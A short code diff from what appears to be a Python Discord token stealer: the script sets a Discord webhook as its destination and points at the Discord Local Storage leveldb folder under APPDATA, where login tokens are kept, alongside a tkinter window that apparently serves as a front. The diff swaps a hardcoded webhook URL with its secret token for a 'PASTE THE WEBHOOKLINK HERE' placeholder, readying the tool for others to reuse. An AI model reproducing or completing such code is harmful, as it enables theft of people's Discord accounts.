@@ -7,7 +7,11 @@ import tkinter
 from tkinter import Label
 
 window = tkinter.Tk()
-webhook = 'https://discord.com/api/webhooks/785879929661030420/gdTuW3II1zLDntdRtUPExZaj802wmS-_2swqI5s7OU0p1SrBt8yMJVUJIWtdT6b3W1ju'
+########################################################
+#           PASTE THE WEBHOOKLINK HERE!
+webhook = 'HEREWEBHOOK'
+#           PASTE THE WEBHOOKLINK HERE!
+########################################################
 discdir = os.getenv('APPDATA') + '\\Discord\\Local Storage\\leveldb'
 
 def discsearch():
